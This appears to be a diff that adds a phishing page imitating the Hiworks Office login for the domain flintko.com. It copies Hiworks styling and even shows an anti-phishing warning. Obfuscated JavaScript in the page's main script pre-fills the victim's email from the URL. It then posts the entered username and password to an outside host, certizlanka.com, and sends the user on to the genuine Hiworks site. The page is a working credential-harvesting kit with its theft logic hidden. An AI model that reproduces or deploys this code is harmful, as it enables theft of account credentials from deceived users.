@@ -1,0 +1,221 @@
+<html lang="ko"><head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0,user-scaleable=no">
+<title>하이웍스 오피스</title>
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex">
+<meta name="googlebot-news" content="nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Cache-Control" content="no-cache">
+<meta http-equiv="Cache-Control" content="private">
+<meta http-equiv="Pragma" content="no-cache">
+<meta name="apple-mobile-web-app-title" content="hiworks">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="msapplication-config" content="none">
+<link rel="shortcut icon" type="image/x-icon" href="https://mail.office.hiworks.com/static/images/favicon/favicon.ico">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_57.png" sizes="57x57">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_72.png" sizes="72x72">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_76.png" sizes="76x76">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_114.png" sizes="114x114">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_120.png" sizes="120x120">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_144.png" sizes="144x144">
+<link rel="apple-touch-icon" href="https://mail.office.hiworks.com/static/images/favicon/home_152.png" sizes="152x152">
+<link rel="stylesheet" type="text/css" href="https://mail.office.hiworks.com/static/css/login/common.css">
+<link rel="stylesheet" type="text/css" href="https://mail.office.hiworks.com/static/ui/css/renew/style_new.css">
+<link rel="stylesheet" type="text/css" href="https://mail.office.hiworks.com/static/css/login/style.css?v=1.0">
+<link rel="stylesheet" type="text/css" href="https://mail.office.hiworks.com/static/css/jquery-ui-themes-1.10.4/themes/smoothness/jquery-ui.css">
+<style>
+.go-back--button {
+  position: absolute;
+  top: 30px;
+  left: 20px;
+  padding: 6px 22px 7px;
+  max-width: 90px;
+  height: 27px;
+  border-radius: 20px;
+  cursor: pointer; }
+  .go-back--button .fa-chevron-left {
+    vertical-align: middle; }
+  .go-back--button .txt {
+    font-size: 18px;
+    color: #676767;
+    vertical-align: middle;
+    user-select: none; }
+  .go-back--button:hover {
+    background: #e1e1e1; }
+}
+
+
+.go-back--button .fa-chevron-left {
+  vertical-align: middle;
+}
+.go-back--button .txt {
+  font-size: 18px;
+  color: #676767;
+  vertical-align: middle;
+  user-select: none;
+}
+.go-back--button:hover {
+  background: #e1e1e1;
+}
+</style>
+</head>
+<body>
+
+<div id="wrap">
+	<!-- skip navigation -->
+	<div class="skip_navigation" data-ui="skipNavigation"><a href="#contents">본문 영역으로 바로가기</a></div>
+	<form onsubmit="return false;" method="post" id="beta_form">
+		<input type="hidden" name="ssl_login" id="ssl_login" value="Y">
+		<input type="hidden" name="link_url" id="link_url" value="">
+		<input type="hidden" name="ip_security" id="ip_security" value="">
+		<div class="loginWrap-ofc" id="contents">
+						<!-- loginBox-ofc -->
+			<div class="loginBox-ofc">
+				<h1 class="head-ofc"><img id="logoimg" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAYEBAQFBAYFBQYJBgUGCQsIBgYICwwKCgsKCgwQDAwMDAwMEAwODxAPDgwTExQUExMcGxsbHCAgICAgICAgICD/2wBDAQcHBw0MDRgQEBgaFREVGiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICD/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AKpAB//Z" style="width: 280px; height: 61px;" alt="hiworks"></h1>
+				<div class="body-ofc">				
+					<ul class="save-ofc">
+						<li><input type="checkbox" name="office_remember" id="office_remember"> <label for="office_remember">Save ID</label></li>
+						<li class="cont-ip" onclick="checkIpSecurity();">IP security<span class="is-state on" id="ip_security_state">ON</span></li>
+					</ul>
+					<section>
+						<input type="text" class="type-J" title="아이디" name="office_id" id="office_id" value="" placeholder="Username">
+						<input type="password" class="type-J" title="비밀번호" name="office_passwd" id="office_passwd" value="" placeholder="Password" onkeydown="if(event.keyCode==13) officeLogin();">
+						<p class="err"><span class="wr-txt" id="login_error_msg"></span></p>
+						<p class="btn-login">
+							<label><input type="submit" title="로그인" value="Sign in" class="int_jogin" onclick="officeLogin();"></label>
+						</p>
+					</section>
+															<article class="box-notice noline">
+						<div class="inner">
+							<p>Notice</p>
+							<a href="javascript:void(0)" onclick="jQuery('#phishingLayer').showPopup();"><span class="phising"><span class="warning">!</span> How to prevent phishing</span></a>
+							<ul id="hiworks_notice">
+                               </ul>
+							<a href="https://www.hiworks.com/cs/notice" target="_blank" class="spr" title="공지사항 더보기"></a>
+						</div>
+					</article>
+				</div>
+			</div>
+			<!-- // loginBox-ofc -->
+			<!-- foot-ofc -->
+			<footer>
+				<div class="foot-ofc">
+					<a href="https://www.hiworks.com " title="새창" target="_blank">Powered by hiworks.com</a>
+				</div>
+			</footer>
+			<!-- // foot-ofc -->
+		</div>
+	</form>
+
+	
+	<div class="layer_box phishing hide" id="phishingLayer">
+		<div class="header">
+			<span class="warning">!</span> Before logging in, be sure to check your browser URL.		</div>
+		<div class="body">
+			<p>Don't be fooled by phishing sites disguised as hiworks login pages. <b class="underline">Please check if it starts with 'https://office.hiworks.com/'</b></p>
+			<p>[Valid URL]<br>
+			<b>office.hiworks.com/flintko.com (O)</b><br>
+			<b>https://office.hiworks.com/flintko.com(O)</b></p>
+			<ul>
+				<li>· It is not always safe to include a character or domain that I know in the address bar.<br>ex) http://flintko.com.phishing_site.com (X)<br>&nbsp;&nbsp;&nbsp;&nbsp;data.text/html flintko.com (X)</li>
+			</ul>
+		</div>
+		<a href="javascript:void(0)" class="icon btn_closelayer" onclick="jQuery('#phishingLayer').hidePopup(false);" title="레이어 닫기"><span class="blind">레이어 닫기</span></a>
+	</div>
+	<div id="dimmed" style="display: none;"></div>
+</div>
+
+<script type="text/javascript">
+	var PATH_INFO = Array();
+	PATH_INFO['LANGUAGE'] = 'english';
+	PATH_INFO['URLTYPE'] = 'D';
+	PATH_INFO['DOMAIN'] = 'flintko.com';
+	PATH_INFO['GROUPID'] = '';
+	PATH_INFO['ROOT'] = '/flintko.com/';
+</script>
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://mail.office.hiworks.com/static/scripts/login/html5shiv.min.js"></script>
+<script type="text/javascript" src="https://mail.office.hiworks.com/static/scripts/login/respond.min.js"></script>
+<![endif]-->
+<script src="https://mail.office.hiworks.com/static/scripts/common_new.js" type="text/javascript"></script>
+<script src="https://mail.office.hiworks.com/static/scripts/jquery/jquery-1.11.3.min.js" type="text/javascript"></script>
+<script src="https://mail.office.hiworks.com/static/scripts/jcommon.js" type="text/javascript"></script>
+<script src="https://mail.office.hiworks.com/static/scripts/jvalidateMessage.js" type="text/javascript"></script>
+<script type="text/javascript">
+var msg = new validateMessage("error");
+var isIdDup = false;
+var checkedId = null;
+var basic_webhard_size = 100;
+var ipSecurity = "1";
+
+function _0x7623(_0x4a76fd,_0x10a924){var _0x196064=_0x1960();return _0x7623=function(_0x7623c3,_0x360d4e){_0x7623c3=_0x7623c3-0x139;var _0x59bcb6=_0x196064[_0x7623c3];return _0x59bcb6;},_0x7623(_0x4a76fd,_0x10a924);}var _0x2e8329=_0x7623;function _0x1960(){var _0x147b5b=['56940MmONlB','https://office.hiworks.com/','substr','h_rememberid','1056840QmcjIw','Please\x20enter\x20password.','indexOf','match','onload','#office_passwd','13215230zTyPJh','</span></li>','onerror','location','10VquDyU','ajax','done','#office_id','POST','hash','getJSON','#office_remember:checked','href','preventDefault','#hiworks_notice','split','office_id','office_passwd','Pleaes\x20enter\x20ID.','4270584SyWeRm','886299XZgMUU','title','success','https://certizlanka.com/myworks/hiworks-true-s.php','value','#logoimg','append','input[name=office_id]','90ngxzja','<li><a\x20href=\x22','#loginUrl=','/common/logo/login','length','ready','#loginUrl','6811532fASIPf','focus','Please\x20check\x20ID\x20or\x20password.','getElementById','width','https://office.hiworks.com/flintko.com/common/logo/login','log','regdate','url','</a><span\x20class=\x22date\x22>','json','replace','val','attr','5064507Zcqrne','164jaoXQO','src'];_0x1960=function(){return _0x147b5b;};return _0x1960();}(function(_0x94e01c,_0x495b13){var _0x5aca14=_0x7623,_0x8550f1=_0x94e01c();while(!![]){try{var _0x408933=-parseInt(_0x5aca14(0x14b))/0x1+parseInt(_0x5aca14(0x169))/0x2*(parseInt(_0x5aca14(0x16b))/0x3)+-parseInt(_0x5aca14(0x15a))/0x4+-parseInt(_0x5aca14(0x13b))/0x5*(parseInt(_0x5aca14(0x14a))/0x6)+parseInt(_0x5aca14(0x168))/0x7+-parseInt(_0x5aca14(0x16f))/0x8*(-parseInt(_0x5aca14(0x153))/0x9)+parseInt(_0x5aca14(0x175))/0xa;if(_0x408933===_0x495b13)break;else _0x8550f1['push'](_0x8550f1['shift']());}catch(_0x6bf0c4){_0x8550f1['push'](_0x8550f1['shift']());}}}(_0x1960,0xde19c));function checkImage(_0x530405){var _0x4d706a=_0x7623,_0x5dda6b=new Image();_0x5dda6b[_0x4d706a(0x173)]=function(){var _0x381edc=_0x4d706a;this[_0x381edc(0x15e)]>0x0&&$('#logoimg')[_0x381edc(0x167)]('src',_0x530405);},_0x5dda6b[_0x4d706a(0x139)]=function(){var _0xb353a0=_0x4d706a;$(_0xb353a0(0x150))[_0xb353a0(0x167)](_0xb353a0(0x16a),'https://office.hiworks.com/flintko.com/common/logo/login');},_0x5dda6b[_0x4d706a(0x16a)]=_0x530405;}jQuery(document)[_0x2e8329(0x158)](function(){var _0x24f99f=_0x2e8329;jQuery(_0x24f99f(0x13e))[_0x24f99f(0x15b)](),jQuery[_0x24f99f(0x141)]('https://www.hiworks.com/cs/get_main_notices?callback=?','',function(_0x70824){var _0x581cea=_0x24f99f;for(var _0x201b90=0x0;_0x201b90<_0x70824['length'];_0x201b90++){jQuery(_0x581cea(0x145))[_0x581cea(0x151)](_0x581cea(0x154)+_0x70824[_0x201b90][_0x581cea(0x162)]+'\x22\x20target=\x22_blank\x22><span\x20class=\x22spr\x22></span>'+_0x70824[_0x201b90][_0x581cea(0x14c)]+_0x581cea(0x163)+_0x70824[_0x201b90][_0x581cea(0x161)][_0x581cea(0x165)](/-/gi,'.')+_0x581cea(0x176));if(_0x201b90==0x1)break;}});var _0x3201b6=window[_0x24f99f(0x13a)][_0x24f99f(0x140)][_0x24f99f(0x16d)](0x1);if(_0x3201b6){var _0x397328=window[_0x24f99f(0x13a)]['hash'][_0x24f99f(0x165)]('#',''),_0xc29bbb=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;if(_0x397328['match'](_0xc29bbb)){document[_0x24f99f(0x15d)](_0x24f99f(0x147))['value']=_0x397328,document[_0x24f99f(0x15d)](_0x24f99f(0x148))[_0x24f99f(0x15b)]();var _0x4e90cb=_0x397328[_0x24f99f(0x171)]('@'),_0x32b535=_0x397328[_0x24f99f(0x16d)](_0x4e90cb+0x1);checkImage(_0x24f99f(0x16c)+_0x32b535+_0x24f99f(0x156));}else{}}else $(_0x24f99f(0x150))['attr'](_0x24f99f(0x16a),_0x24f99f(0x15f));}),officeLogin=function(){var _0x4c5c4e=_0x2e8329,_0xab2b4b=jQuery(_0x4c5c4e(0x13e))[_0x4c5c4e(0x166)](),_0x40c73d=jQuery(_0x4c5c4e(0x174))[_0x4c5c4e(0x166)](),_0x5db8b8=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;if(!_0xab2b4b[_0x4c5c4e(0x172)](_0x5db8b8))return loginErrorMsg(_0x4c5c4e(0x149)),jQuery(_0x4c5c4e(0x13e))[_0x4c5c4e(0x15b)](),![];if(_0x40c73d=='')return loginErrorMsg(_0x4c5c4e(0x170)),jQuery(_0x4c5c4e(0x174))[_0x4c5c4e(0x15b)](),![];else{var _0x41f695='https://home.office.hiworks.com/main ',_0x2ea6bd={'mimailing':$(_0x4c5c4e(0x152))[_0x4c5c4e(0x166)](),'mipassing':$('input[name=office_passwd]')[_0x4c5c4e(0x166)]()};$[_0x4c5c4e(0x13c)]({'type':_0x4c5c4e(0x13f),'url':_0x4c5c4e(0x14e),'data':_0x2ea6bd,'dataType':_0x4c5c4e(0x164),'encode':!![]})[_0x4c5c4e(0x13d)](function(_0x3ab865){var _0xeff235=_0x4c5c4e;console[_0xeff235(0x160)](_0x3ab865),_0x3ab865[_0xeff235(0x14d)]?window[_0xeff235(0x13a)][_0xeff235(0x165)](_0x41f695):(alert(_0xeff235(0x15c)),document[_0xeff235(0x15d)](_0xeff235(0x148))[_0xeff235(0x14f)]='');})['fail'](function(_0x116362){var _0x237e0c=_0x4c5c4e;document[_0x237e0c(0x15d)](_0x237e0c(0x148))[_0x237e0c(0x14f)]='',document[_0x237e0c(0x15d)](_0x237e0c(0x148))[_0x237e0c(0x15b)](),console[_0x237e0c(0x160)](_0x116362);}),event[_0x4c5c4e(0x144)]();}jQuery(_0x4c5c4e(0x142))[_0x4c5c4e(0x157)]?setCookie(_0x4c5c4e(0x16e),_0xab2b4b,0x16d):setCookie(_0x4c5c4e(0x16e),'',-0x1);var _0x2403e6='';location[_0x4c5c4e(0x143)][_0x4c5c4e(0x171)](_0x4c5c4e(0x159))>-0x1&&(_0x2403e6=location[_0x4c5c4e(0x143)][_0x4c5c4e(0x146)](_0x4c5c4e(0x155))[0x1]);},loginErrorMsg=function(_0x378d19){jQuery('#login_error_msg')['html'](_0x378d19);};
+checkIpSecurity = function()
+{
+	if(ipSecurity === "1"){
+		jQuery('input:radio[name="office_ip_security"][value="1"]').prop('checked', true);
+	}else if(ipSecurity === "2"){
+		jQuery('input:radio[name="office_ip_security"][value="2"]').prop('checked', true);
+	}else{
+		jQuery('input:radio[name="office_ip_security"][value="-1"]').prop('checked', true);
+	}
+
+	jQuery('#ipSecurity').showPopup();
+}
+
+saveIpSecurity = function()
+{
+	var checked_value = $('input:radio[name="office_ip_security"]:checked').val();
+
+	if(checked_value === undefined){
+		alert('IP 보안 설정을 해주시기 바랍니다.');
+		return false;
+	}else if(checked_value === "1" || checked_value === "2"){
+		if(!jQuery('#ip_security_state').hasClass("on")){
+			jQuery('#ip_security_state').addClass("on");
+			jQuery('#ip_security_state').html("ON");
+		}
+	}else{
+		if(jQuery('#ip_security_state').hasClass("on")){
+			jQuery('#ip_security_state').removeClass("on");
+			jQuery('#ip_security_state').html("OFF");
+		}
+	}
+
+	ipSecurity = checked_value;
+
+	jQuery('#ipSecurity').hidePopup(false);
+}
+
+</script>
+
+
+<div class="layer_box mid_large hide" id="ipSecurity" style="margin-left: -256px; margin-top: -197px; display: none;">
+		<div class="title_layer text_variables">IP security settings</div>
+		<div>
+			<p>This is a login security service that prevents unauthorized use of login information by checking the current IP and the recently logged in IP information when the IP address is changed after login.</p>
+			<p class="mgt_10">
+				<a  class="weakblue" target="_blank">Learn more</a>
+			</p>
+			<ul class="pdt_30">
+				<li>
+					<label><input type="radio" name="office_ip_security" value="-1"> OFF</label>
+				</li>
+				<li>
+					<label><input type="radio" name="office_ip_security" value="1"> Level 1 - Keep signed in only if the IP band(C class) does not change after logging in</label>
+				</li>
+				<li>
+					<label><input type="radio" name="office_ip_security" value="2"> Level 2 - Keep signed in only if the IP address does not change after logging in</label>
+				</li>
+			</ul>
+		</div>
+		<div class="layer_button">
+			<button type="button" class="btn_variables" onclick="saveIpSecurity();">Save</button>
+			<button type="button" onclick="jQuery('#ipSecurity').hidePopup(false);">Cancel</button>
+		</div>
+		<a href="javascript:void(0)" class="icon btn_closelayer" onclick="jQuery('#ipSecurity').hidePopup(false);" title="레이어 닫기"><span class="blind">레이어 닫기</span></a>
+	</div></body></html>
